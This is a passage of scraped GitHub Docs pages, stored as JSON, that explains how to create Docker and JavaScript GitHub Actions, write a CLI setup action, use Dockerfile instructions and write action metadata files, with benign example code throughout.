        "content": "# Hello world docker action\n\nThis action prints \"Hello World\" or \"Hello\" + the name of a person to greet to the log.\n\n## Inputs\n\n## `who-to-greet`\n\n**Required** The name of the person to greet. Default `\"World\"`.\n\n## Outputs\n\n## `time`\n\nThe time we greeted you.\n\n## Example usage\n\nuses: actions/hello-world-docker-action@v2\nwith:\n  who-to-greet: 'Mona the Octocat'"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Commit, tag, and push your action"
      },
      {
        "type": "paragraph",
        "text": "From your terminal, commit youraction.yml,entrypoint.sh,Dockerfile, andREADME.mdfiles."
      },
      {
        "type": "paragraph",
        "text": "It's best practice to also add a version tag for releases of your action. For more information on versioning your action, seeAbout custom actions."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "git add action.yml entrypoint.sh Dockerfile README.md\ngit commit -m \"My first action is ready\"\ngit tag -a -m \"My first action release\" v1\ngit push --follow-tags"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Testing out your action in a workflow"
      },
      {
        "type": "paragraph",
        "text": "Now you're ready to test your action out in a workflow."
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "When an action is in a private repository, you can control who can access it. For more information, seeManaging GitHub Actions settings for a repository.",
          "When an action is in an internal repository, the action can only be used in workflows in the same repository.",
          "Public actions can be used by workflows in any repository."
        ]
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example using a public action"
      },
      {
        "type": "paragraph",
        "text": "The following workflow code uses the completedhello worldaction in the publicactions/hello-world-docker-actionrepository. Copy the following workflow example code into a.github/workflows/main.ymlfile, but replace theactions/hello-world-docker-actionwith your repository and action name. You can also replace thewho-to-greetinput with your name. Public actions can be used even if they're not published to GitHub Marketplace. For more information, seePublishing actions in GitHub Marketplace."
      },
      {
        "type": "paragraph",
        "text": ".github/workflows/main.yml"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on: [push]\n\njobs:\n  hello_world_job:\n    runs-on: ubuntu-latest\n    name: A job to say hello\n    steps:\n      - name: Hello world action step\n        id: hello\n        uses: actions/hello-world-docker-action@v2\n        with:\n          who-to-greet: 'Mona the Octocat'\n      # Use the output from the `hello` step\n      - name: Get the output time\n        run: echo \"The time was ${{ steps.hello.outputs.time }}\""
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example using a private action"
      },
      {
        "type": "paragraph",
        "text": "Copy the following example workflow code into a.github/workflows/main.ymlfile in your action's repository. You can also replace thewho-to-greetinput with your name. This private action can't be published to GitHub Marketplace, and can only be used in this repository."
      },
      {
        "type": "paragraph",
        "text": ".github/workflows/main.yml"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on: [push]\n\njobs:\n  hello_world_job:\n    runs-on: ubuntu-latest\n    name: A job to say hello\n    steps:\n      # To use this repository's private action,\n      # you must check out the repository\n      - name: Checkout\n        uses: actions/checkout@v4\n      - name: Hello world action step\n        uses: ./ # Uses an action in the root directory\n        id: hello\n        with:\n          who-to-greet: 'Mona the Octocat'\n      # Use the output from the `hello` step\n      - name: Get the output time\n        run: echo \"The time was ${{ steps.hello.outputs.time }}\""
      },
      {
        "type": "paragraph",
        "text": "From your repository, click theActionstab, and select the latest workflow run. UnderJobsor in the visualization graph, clickA job to say hello."
      },
      {
        "type": "paragraph",
        "text": "ClickHello world action step, and you should see \"Hello Mona the Octocat\" or the name you used for thewho-to-greetinput printed in the log. To see the timestamp, clickGet the output time."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Accessing files created by a container action"
      },
      {
        "type": "paragraph",
        "text": "When a container action runs, it will automatically map the default working directory (GITHUB_WORKSPACE) on the runner with the/github/workspacedirectory on the container. Any files added to this directory on the container will be available to any subsequent steps in the same job. For example, if you have a container action that builds your project, and you would like to upload the build output as an artifact, you can use the following steps."
      },
      {
        "type": "paragraph",
        "text": "workflow.yml"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "jobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - name: Checkout\n        uses: actions/checkout@v4\n\n      # Output build artifacts to /github/workspace on the container.\n      - name: Containerized Build\n        uses: ./.github/actions/my-container-action\n\n      - name: Upload Build Artifacts\n        uses: actions/upload-artifact@v4\n        with:\n          name: workspace_artifacts\n          path: ${{ github.workspace }}"
      },
      {
        "type": "paragraph",
        "text": "For more information about uploading build output as an artifact, seeStoring and sharing data from a workflow."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Example Docker container actions on GitHub.com"
      },
      {
        "type": "paragraph",
        "text": "You can find many examples of Docker container actions on GitHub.com."
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "github/issue-metrics",
          "microsoft/infersharpaction",
          "microsoft/ps-docs"
        ]
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/sharing-automations/creating-actions/creating-a-javascript-action",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "Introduction"
      },
      {
        "type": "paragraph",
        "text": "In this guide, you'll learn about the basic components needed to create and use a packaged JavaScript action. To focus this guide on the components needed to package the action, the functionality of the action's code is minimal. The action prints \"Hello World\" in the logs or \"Hello [who-to-greet]\" if you provide a custom name."
      },
      {
        "type": "paragraph",
        "text": "This guide uses the GitHub Actions Toolkit Node.js module to speed up development. For more information, see theactions/toolkitrepository."
      },
      {
        "type": "paragraph",
        "text": "Once you complete this project, you should understand how to build your own JavaScript action and test it in a workflow."
      },
      {
        "type": "paragraph",
        "text": "To ensure your JavaScript actions are compatible with all GitHub-hosted runners (Ubuntu, Windows, and macOS), the packaged JavaScript code you write should be pure JavaScript and not rely on other binaries. JavaScript actions run directly on the runner and use binaries that already exist in the runner image."
      },
      {
        "type": "paragraph",
        "text": "Warning"
      },
      {
        "type": "paragraph",
        "text": "When creating workflows and actions, you should always consider whether your code might execute untrusted input from possible attackers. Certain contexts should be treated as untrusted input, as an attacker could insert their own malicious content. For more information, seeSecurity hardening for GitHub Actions."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Prerequisites"
      },
      {
        "type": "paragraph",
        "text": "Before you begin, you'll need to download Node.js and create a public GitHub repository."
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "Download and install Node.js 20.x, which includes npm.https://nodejs.org/en/download/",
          "Create a new public repository on GitHub and call it \"hello-world-javascript-action\". For more information, seeCreating a new repository.",
          "Clone your repository to your computer. For more information, seeCloning a repository.",
          "From your terminal, change directories into your new repository.Shellcd hello-world-javascript-actioncd hello-world-javascript-action",
          "From your terminal, initialize the directory with npm to generate apackage.jsonfile.Shellnpm init -ynpm init -y"
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Creating an action metadata file"
      },
      {
        "type": "paragraph",
        "text": "Create a new file namedaction.ymlin thehello-world-javascript-actiondirectory with the following example code. For more information, seeMetadata syntax for GitHub Actions."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "name: 'Hello World'\ndescription: 'Greet someone and record the time'\ninputs:\n  who-to-greet:  # id of input\n    description: 'Who to greet'\n    required: true\n    default: 'World'\noutputs:\n  time: # id of output\n    description: 'The time we greeted you'\nruns:\n  using: 'node20'\n  main: 'index.js'"
      },
      {
        "type": "paragraph",
        "text": "This file defines thewho-to-greetinput andtimeoutput. It also tells the action runner how to start running this JavaScript action."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Adding actions toolkit packages"
      },
      {
        "type": "paragraph",
        "text": "The actions toolkit is a collection of Node.js packages that allow you to quickly build JavaScript actions with more consistency."
      },
      {
        "type": "paragraph",
        "text": "The toolkit@actions/corepackage provides an interface to the workflow commands, input and output variables, exit statuses, and debug messages."
      },
      {
        "type": "paragraph",
        "text": "The toolkit also offers a@actions/githubpackage that returns an authenticated Octokit REST client and access to GitHub Actions contexts."
      },
      {
        "type": "paragraph",
        "text": "The toolkit offers more than thecoreandgithubpackages. For more information, see theactions/toolkitrepository."
      },
      {
        "type": "paragraph",
        "text": "At your terminal, install the actions toolkitcoreandgithubpackages."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "npm install @actions/core\nnpm install @actions/github"
      },
      {
        "type": "paragraph",
        "text": "Now you should see anode_modulesdirectory with the modules you just installed and apackage-lock.jsonfile with the installed module dependencies and the versions of each installed module."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Writing the action code"
      },
      {
        "type": "paragraph",
        "text": "This action uses the toolkit to get thewho-to-greetinput variable required in the action's metadata file and prints \"Hello [who-to-greet]\" in a debug message in the log. Next, the script gets the current time and sets it as an output variable that actions running later in a job can use."
      },
      {
        "type": "paragraph",
        "text": "GitHub Actions provide context information about the webhook event, Git refs, workflow, action, and the person who triggered the workflow. To access the context information, you can use thegithubpackage. The action you'll write will print the webhook event payload to the log."
      },
      {
        "type": "paragraph",
        "text": "Add a new file calledindex.js, with the following code."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "const core = require('@actions/core');\nconst github = require('@actions/github');\n\ntry {\n  // `who-to-greet` input defined in action metadata file\n  const nameToGreet = core.getInput('who-to-greet');\n  console.log(`Hello ${nameToGreet}!`);\n  const time = (new Date()).toTimeString();\n  core.setOutput(\"time\", time);\n  // Get the JSON webhook payload for the event that triggered the workflow\n  const payload = JSON.stringify(github.context.payload, undefined, 2)\n  console.log(`The event payload: ${payload}`);\n} catch (error) {\n  core.setFailed(error.message);\n}"
      },
      {
        "type": "paragraph",
        "text": "If an error is thrown in the aboveindex.jsexample,core.setFailed(error.message);uses the actions toolkit@actions/corepackage to log a message and set a failing exit code. For more information, seeSetting exit codes for actions."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Creating a README"
      },
      {
        "type": "paragraph",
        "text": "To let people know how to use your action, you can create a README file. A README is most helpful when you plan to share your action publicly, but is also a great way to remind you or your team how to use the action."
      },
      {
        "type": "paragraph",
        "text": "In yourhello-world-javascript-actiondirectory, create aREADME.mdfile that specifies the following information:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "A detailed description of what the action does.",
          "Required input and output arguments.",
          "Optional input and output arguments.",
          "Secrets the action uses.",
          "Environment variables the action uses.",
          "An example of how to use your action in a workflow."
        ]
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "# Hello world javascript action\n\nThis action prints \"Hello World\" or \"Hello\" + the name of a person to greet to the log.\n\n## Inputs\n\n### `who-to-greet`\n\n**Required** The name of the person to greet. Default `\"World\"`.\n\n## Outputs\n\n### `time`\n\nThe time we greeted you.\n\n## Example usage\n\n```yaml\nuses: actions/hello-world-javascript-action@e76147da8e5c81eaf017dede5645551d4b94427b\nwith:\n  who-to-greet: 'Mona the Octocat'\n```"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Commit, tag, and push your action"
      },
      {
        "type": "paragraph",
        "text": "GitHub downloads each action run in a workflow during runtime and executes it as a complete package of code before you can use workflow commands likerunto interact with the runner machine. This means you must include any package dependencies required to run the JavaScript code. You'll need to check in the toolkitcoreandgithubpackages to your action's repository."
      },
      {
        "type": "paragraph",
        "text": "From your terminal, commit youraction.yml,index.js,node_modules,package.json,package-lock.json, andREADME.mdfiles. If you added a.gitignorefile that listsnode_modules, you'll need to remove that line to commit thenode_modulesdirectory."
      },
      {
        "type": "paragraph",
        "text": "It's best practice to also add a version tag for releases of your action. For more information on versioning your action, seeAbout custom actions."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "git add action.yml index.js node_modules/* package.json package-lock.json README.md\ngit commit -m \"My first action is ready\"\ngit tag -a -m \"My first action release\" v1.1\ngit push --follow-tags"
      },
      {
        "type": "paragraph",
        "text": "Checking in yournode_modulesdirectory can cause problems. As an alternative, you can use a tool called@vercel/nccto compile your code and modules into one file used for distribution."
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "Installvercel/nccby running this command in your terminal.npm i -g @vercel/ncc",
          "Compile yourindex.jsfile.ncc build index.js --license licenses.txtYou'll see a newdist/index.jsfile with your code and the compiled modules. You will also see an accompanyingdist/licenses.txtfile containing all the licenses of thenode_modulesyou are using.",
          "Change themainkeyword in youraction.ymlfile to use the newdist/index.jsfile.main: 'dist/index.js'",
          "If you already checked in yournode_modulesdirectory, remove it.rm -rf node_modules/*",
          "From your terminal, commit the updates to youraction.yml,dist/index.js, andnode_modulesfiles.Shellgit add action.yml dist/index.js node_modules/*\ngit commit -m \"Use vercel/ncc\"\ngit tag -a -m \"My first action release\" v1.1\ngit push --follow-tagsgit add action.yml dist/index.js node_modules/*\ngit commit -m \"Use vercel/ncc\"\ngit tag -a -m \"My first action release\" v1.1\ngit push --follow-tags"
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Testing out your action in a workflow"
      },
      {
        "type": "paragraph",
        "text": "Now you're ready to test your action out in a workflow."
      },
      {
        "type": "paragraph",
        "text": "Public actions can be used by workflows in any repository. When an action is in a private repository, the repository settings dictate whether the action is available only within the same repository or also to other repositories owned by the same user or organization. For more information, seeManaging GitHub Actions settings for a repository."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example using a public action"
      },
      {
        "type": "paragraph",
        "text": "This example demonstrates how your new public action can be run from within an external repository."
      },
      {
        "type": "paragraph",
        "text": "Copy the following YAML into a new file at.github/workflows/main.yml, and update theuses: octocat/hello-world-javascript-action@1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0bline with your username and the name of the public repository you created above. You can also replace thewho-to-greetinput with your name."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on: [push]\n\njobs:\n  hello_world_job:\n    runs-on: ubuntu-latest\n    name: A job to say hello\n    steps:\n      - name: Hello world action step\n        id: hello\n        uses: octocat/hello-world-javascript-action@1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b\n        with:\n          who-to-greet: 'Mona the Octocat'\n      # Use the output from the `hello` step\n      - name: Get the output time\n        run: echo \"The time was ${{ steps.hello.outputs.time }}\""
      },
      {
        "type": "paragraph",
        "text": "When this workflow is triggered, the runner will download thehello-world-javascript-actionaction from your public repository and then execute it."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example using a private action"
      },
      {
        "type": "paragraph",
        "text": "Copy the workflow code into a.github/workflows/main.ymlfile in your action's repository. You can also replace thewho-to-greetinput with your name."
      },
      {
        "type": "paragraph",
        "text": ".github/workflows/main.yml"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on: [push]\n\njobs:\n  hello_world_job:\n    runs-on: ubuntu-latest\n    name: A job to say hello\n    steps:\n      # To use this repository's private action,\n      # you must check out the repository\n      - name: Checkout\n        uses: actions/checkout@v4\n      - name: Hello world action step\n        uses: ./ # Uses an action in the root directory\n        id: hello\n        with:\n          who-to-greet: 'Mona the Octocat'\n      # Use the output from the `hello` step\n      - name: Get the output time\n        run: echo \"The time was ${{ steps.hello.outputs.time }}\""
      },
      {
        "type": "paragraph",
        "text": "From your repository, click theActionstab, and select the latest workflow run. UnderJobsor in the visualization graph, clickA job to say hello."
      },
      {
        "type": "paragraph",
        "text": "ClickHello world action step, and you should see \"Hello Mona the Octocat\" or the name you used for thewho-to-greetinput printed in the log. To see the timestamp, clickGet the output time."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Template repositories for creating JavaScript actions"
      },
      {
        "type": "paragraph",
        "text": "GitHub provides template repositories for creating JavaScript and TypeScript actions. You can use these templates to quickly get started with creating a new action that includes tests, linting, and other recommended practices."
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "javascript-actiontemplate repository",
          "typescript-actiontemplate repository"
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Example JavaScript actions on GitHub.com"
      },
      {
        "type": "paragraph",
        "text": "You can find many examples of JavaScript actions on GitHub.com."
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "DevExpress/testcafe-action",
          "duckduckgo/privacy-configuration"
        ]
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/sharing-automations/creating-actions/developing-a-third-party-cli-action",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "Introduction"
      },
      {
        "type": "paragraph",
        "text": "You can write an action to provide a way for users to access your servers via a configured CLI environment on GitHub Actions runners."
      },
      {
        "type": "paragraph",
        "text": "Your action should:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Make it simple for users to specify the version of the CLI to install",
          "Support multiple operating systems",
          "Run in an efficient fashion to minimize run-time and associated costs",
          "Work across GitHub-hosted and self-hosted runners",
          "Leverage community tooling when possible"
        ]
      },
      {
        "type": "paragraph",
        "text": "This article will demonstrate how to write an action that retrieves a specific version of your CLI, installs it, adds it to the path, and (optionally) caches it. This type of action (an action that sets up a tool) is often namedsetup-$TOOL."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Prerequisites"
      },
      {
        "type": "paragraph",
        "text": "You should have an understanding of how to write a custom action. For more information, seeAbout custom actions. For a more detailed guide on how to write a custom action, seeCreating a JavaScript action."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Example"
      },
      {
        "type": "paragraph",
        "text": "The following script demonstrates how you can get a user-specified version as input, download and extract the specific version of your CLI, then add the CLI to the path."
      },
      {
        "type": "paragraph",
        "text": "GitHub providesactions/toolkit, which is a set of packages that helps you create actions. This example uses theactions/coreandactions/tool-cachepackages."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "const core = require('@actions/core');\nconst tc = require('@actions/tool-cache');\n\nasync function setup() {\n  // Get version of tool to be installed\n  const version = core.getInput('version');\n\n  // Download the specific version of the tool, e.g. as a tarball\n  const pathToTarball = await tc.downloadTool(getDownloadURL());\n\n  // Extract the tarball onto the runner\n  const pathToCLI = await tc.extractTar(pathToTarball);\n\n  // Expose the tool by adding it to the PATH\n  core.addPath(pathToCLI)\n}\n\nmodule.exports = setup"
      },
      {
        "type": "paragraph",
        "text": "To use this script, replacegetDownloadURLwith a function that downloads your CLI. You will also need to create an actions metadata file (action.yml) that accepts aversioninput and that runs this script. For full details about how to create an action, seeCreating a JavaScript action."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Further reading"
      },
      {
        "type": "paragraph",
        "text": "This pattern is employed in several actions. For more examples, see:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "ruby/setup-ruby",
          "google-github-actions/setup-gcloud",
          "hashicorp/setup-terraform"
        ]
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/sharing-automations/creating-actions/dockerfile-support-for-github-actions",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "About Dockerfile instructions"
      },
      {
        "type": "paragraph",
        "text": "ADockerfilecontains instructions and arguments that define the contents and startup behavior of a Docker container. For more information about the instructions Docker supports, seeDockerfile referencein the Docker documentation."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Dockerfile instructions and overrides"
      },
      {
        "type": "paragraph",
        "text": "Some Docker instructions interact with GitHub Actions, and an action's metadata file can override some Docker instructions. Ensure that you are familiar with how your Dockerfile interacts with GitHub Actions to prevent any unexpected behavior."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "USER"
      },
      {
        "type": "paragraph",
        "text": "Docker actions must be run by the default Docker user (root). Do not use theUSERinstruction in yourDockerfile, because you won't be able to access theGITHUB_WORKSPACEdirectory. For more information, seeStore information in variablesandUSER referencein the Docker documentation."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "FROM"
      },
      {
        "type": "paragraph",
        "text": "The first instruction in theDockerfilemust beFROM, which selects a Docker base image. For more information, see theFROM referencein the Docker documentation."
      },
      {
        "type": "paragraph",
        "text": "These are some best practices when setting theFROMargument:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "It's recommended to use official Docker images. For example,pythonorruby.",
          "Use a version tag if it exists, preferably with a major version. For example, usenode:10instead ofnode:latest.",
          "It's recommended to use Docker images based on theDebianoperating system."
        ]
      },
      {
        "type": "heading",
        "level": 3,
        "text": "WORKDIR"
      },
      {
        "type": "paragraph",
        "text": "GitHub sets the working directory path in theGITHUB_WORKSPACEenvironment variable. It's recommended to not use theWORKDIRinstruction in yourDockerfile. Before the action executes, GitHub will mount theGITHUB_WORKSPACEdirectory on top of anything that was at that location in the Docker image and setGITHUB_WORKSPACEas the working directory. For more information, seeStore information in variablesand theWORKDIR referencein the Docker documentation."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "ENTRYPOINT"
      },
      {
        "type": "paragraph",
        "text": "If you defineentrypointin an action's metadata file, it will override theENTRYPOINTdefined in theDockerfile. For more information, seeMetadata syntax for GitHub Actions."
      },
      {
        "type": "paragraph",
        "text": "The DockerENTRYPOINTinstruction has ashellform andexecform. The DockerENTRYPOINTdocumentation recommends using theexecform of theENTRYPOINTinstruction. For more information aboutexecandshellform, see theENTRYPOINT referencein the Docker documentation."
      },
      {
        "type": "paragraph",
        "text": "You should not useWORKDIRto specify your entrypoint in your Dockerfile. Instead, you should use an absolute path. For more information, seeWORKDIR."
      },
      {
        "type": "paragraph",
        "text": "If you configure your container to use theexecform of theENTRYPOINTinstruction, theargsconfigured in the action's metadata file won't run in a command shell. If the action'sargscontain an environment variable, the variable will not be substituted. For example, using the followingexecformat will not print the value stored in$GITHUB_SHA, but will instead print\"$GITHUB_SHA\"."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "ENTRYPOINT [\"echo $GITHUB_SHA\"]"
      },
      {
        "type": "paragraph",
        "text": "If you want variable substitution, then either use theshellform or execute a shell directly. For example, using the followingexecformat, you can execute a shell to print the value stored in theGITHUB_SHAenvironment variable."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "ENTRYPOINT [\"sh\", \"-c\", \"echo $GITHUB_SHA\"]"
      },
      {
        "type": "paragraph",
        "text": "To supplyargsdefined in the action's metadata file to a Docker container that uses theexecform in theENTRYPOINT, we recommend creating a shell script calledentrypoint.shthat you call from theENTRYPOINTinstruction:"
      },
      {
        "type": "heading",
        "level": 4,
        "text": "ExampleDockerfile"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "# Container image that runs your code\nFROM debian:9.5-slim\n\n# Copies your code file from your action repository to the filesystem path `/` of the container\nCOPY entrypoint.sh /entrypoint.sh\n\n# Executes `entrypoint.sh` when the Docker container starts up\nENTRYPOINT [\"/entrypoint.sh\"]"
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Exampleentrypoint.shfile"
      },
      {
        "type": "paragraph",
        "text": "Using the example Dockerfile above, GitHub will send theargsconfigured in the action's metadata file as arguments toentrypoint.sh. Add the#!/bin/shshebangat the top of theentrypoint.shfile to explicitly use the system'sPOSIX-compliant shell."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "#!/bin/sh\n\n# `$#` expands to the number of arguments and `$@` expands to the supplied `args`\nprintf '%d args:' \"$#\"\nprintf \" '%s'\" \"$@\"\nprintf '\\n'"
      },
      {
        "type": "paragraph",
        "text": "Your code must be executable. Make sure theentrypoint.shfile hasexecutepermissions before using it in a workflow. You can modify the permission from your terminal using this command:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "chmod +x entrypoint.sh"
      },
      {
        "type": "paragraph",
        "text": "When anENTRYPOINTshell script is not executable, you'll receive an error similar to this:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "Error response from daemon: OCI runtime create failed: container_linux.go:348: starting container process caused \"exec: \\\"/entrypoint.sh\\\": permission denied\": unknown"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "CMD"
      },
      {
        "type": "paragraph",
        "text": "If you defineargsin the action's metadata file,argswill override theCMDinstruction specified in theDockerfile. For more information, seeMetadata syntax for GitHub Actions."
      },
      {
        "type": "paragraph",
        "text": "If you useCMDin yourDockerfile, follow these guidelines:"
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "Document required arguments in the action's README and omit them from theCMDinstruction.",
          "Use defaults that allow using the action without specifying anyargs.",
          "If the action exposes a--helpflag, or something similar, use that to make your action self-documenting."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Supported Linux capabilities"
      },
      {
        "type": "paragraph",
        "text": "GitHub Actions supports the default Linux capabilities that Docker supports. Capabilities can't be added or removed. For more information about the default Linux capabilities that Docker supports, seeLinux kernel capabilitiesin the Docker documentation. To learn more about Linux capabilities, seeOverview of Linux capabilitiesin the Linux man-pages."
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/sharing-automations/creating-actions/metadata-syntax-for-github-actions",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "About YAML syntax for GitHub Actions"
      },
      {
        "type": "paragraph",
        "text": "All actions require a metadata file. The metadata filename must be eitheraction.ymloraction.yaml. The preferred format isaction.yml. The data in the metadata file defines the inputs, outputs, and runs configuration for your action."
      },
      {
        "type": "paragraph",
        "text": "Action metadata files use YAML syntax. If you're new to YAML, you can readLearn YAML in five minutes."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "name"
      },
      {
        "type": "paragraph",
        "text": "RequiredThe name of your action. GitHub displays thenamein theActionstab to help visually identify actions in each job."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "author"
      },
      {
        "type": "paragraph",
        "text": "OptionalThe name of the action's author."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "description"
      },
      {
        "type": "paragraph",
        "text": "RequiredA short description of the action."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "inputs"
      },
      {
        "type": "paragraph",
        "text": "OptionalInput parameters allow you to specify data that the action expects to use during runtime. GitHub stores input parameters as environment variables. We recommend using lowercase input ids."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example: Specifying inputs"
      },
      {
        "type": "paragraph",
        "text": "This example configures two inputs:num-octocatsandoctocat-eye-color. Thenum-octocatsinput is not required and will default to a value of1.octocat-eye-coloris required and has no default value."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "Actions usingrequired: truewill not automatically return an error if the input is not specified."
      },
      {
        "type": "paragraph",
        "text": "Workflow files that use this action can use thewithkeyword to set an input value foroctocat-eye-color. For more information about thewithsyntax, seeWorkflow syntax for GitHub Actions."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "inputs:\n  num-octocats:\n    description: 'Number of Octocats'\n    required: false\n    default: '1'\n  octocat-eye-color:\n    description: 'Eye color of the Octocats'\n    required: true"
      },
      {
        "type": "paragraph",
        "text": "When you specify an input, GitHub creates an environment variable for the input with the nameINPUT_<VARIABLE_NAME>. The environment variable created converts input names to uppercase letters and replaces spaces with_characters."
      },
      {
        "type": "paragraph",
        "text": "If the action is written using acomposite, then it will not automatically getINPUT_<VARIABLE_NAME>. With composite actions you can useinputsAccessing contextual information about workflow runsto access action inputs."
      },
      {
        "type": "paragraph",
        "text": "To access the environment variable in a Docker container action, you must pass the input using theargskeyword in the action metadata file. For more information about the action metadata file for Docker container actions, seeCreating a Docker container action."
      },
      {
        "type": "paragraph",
        "text": "For example, if a workflow defined thenum-octocatsandoctocat-eye-colorinputs, the action code could read the values of the inputs using theINPUT_NUM-OCTOCATSandINPUT_OCTOCAT-EYE-COLORenvironment variables."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "inputs.<input_id>"
      },
      {
        "type": "paragraph",
        "text": "RequiredAstringidentifier to associate with the input. The value of<input_id>is a map of the input's metadata. The<input_id>must be a unique identifier within theinputsobject. The<input_id>must start with a letter or_and contain only alphanumeric characters,-, or_."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "inputs.<input_id>.description"
      },
      {
        "type": "paragraph",
        "text": "RequiredAstringdescription of the input parameter."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "inputs.<input_id>.required"
      },
      {
        "type": "paragraph",
        "text": "OptionalAbooleanto indicate whether the action requires the input parameter. Set totruewhen the parameter is required."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "inputs.<input_id>.default"
      },
      {
        "type": "paragraph",
        "text": "OptionalAstringrepresenting the default value. The default value is used when an input parameter isn't specified in a workflow file."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "inputs.<input_id>.deprecationMessage"
      },
      {
        "type": "paragraph",
        "text": "OptionalIf the input parameter is used, thisstringis logged as a warning message. You can use this warning to notify users that the input is closing down and mention any alternatives."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "outputsfor Docker container and JavaScript actions"
      },
      {
        "type": "paragraph",
        "text": "OptionalOutput parameters allow you to declare data that an action sets. Actions that run later in a workflow can use the output data set in previously run actions. For example, if you had an action that performed the addition of two inputs (x + y = z), the action could output the sum (z) for other actions to use as an input."
      },
      {
        "type": "paragraph",
        "text": "Outputs can be a maximum of 1 MB per job. The total of all outputs in a workflow run can be a maximum of 50 MB. Size is approximated based on UTF-16 encoding."
      },
      {
        "type": "paragraph",
        "text": "If you don't declare an output in your action metadata file, you can still set outputs and use them in a workflow. For more information on setting outputs in an action, seeWorkflow commands for GitHub Actions."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example: Declaring outputs for Docker container and JavaScript actions"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "outputs:\n  sum: # id of the output\n    description: 'The sum of the inputs'"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "outputs.<output_id>"
      },
      {
        "type": "paragraph",
        "text": "RequiredAstringidentifier to associate with the output. The value of<output_id>is a map of the output's metadata. The<output_id>must be a unique identifier within theoutputsobject. The<output_id>must start with a letter or_and contain only alphanumeric characters,-, or_."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "outputs.<output_id>.description"
      },
      {
        "type": "paragraph",
        "text": "RequiredAstringdescription of the output parameter."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "outputsfor composite actions"
      },
      {
        "type": "paragraph",
        "text": "Optionaloutputsuse the same parameters asoutputs.<output_id>andoutputs.<output_id>.description(seeoutputsfor Docker container and JavaScript actions), but also includes thevaluetoken."
      },
      {
        "type": "paragraph",
